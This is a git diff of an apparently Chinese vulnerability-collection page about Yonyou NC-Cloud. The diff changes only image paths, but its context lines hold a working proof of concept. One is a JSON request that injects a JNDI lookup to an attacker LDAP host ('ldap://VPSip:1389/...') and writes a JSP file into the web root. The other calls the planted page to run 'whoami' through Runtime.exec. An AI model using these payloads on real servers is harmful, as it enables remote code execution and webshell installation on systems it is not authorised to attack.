@@ -18,7 +18,7 @@ app="用友-NC-Cloud"
 
 登陆页面
 
-![image-20230828164153665](images/image-20230828164153665.png)
+![image-20230828164153665](../.gitbook/assets/image-20230828164153665.png)
 
 验证POC
 
@@ -48,10 +48,10 @@ Content-Type: application/x-www-form-urlencoded
 {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${''.getClass().forName('javax.naming.InitialContext').newInstance().lookup('ldap://VPSip:1389/TomcatBypass/TomcatEcho')}","webapps/nc_web/301.jsp"]}
 ```
 
-![image-20230828164215853](images/image-20230828164215853.png)
+![image-20230828164215853](../.gitbook/assets/image-20230828164215853.png)
 
 ```
 /cmdtest.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22).getInputStream()) 
 ```
 
-![image-20230828164239659](images/image-20230828164239659.png)
+![image-20230828164239659](../.gitbook/assets/image-20230828164239659.png)
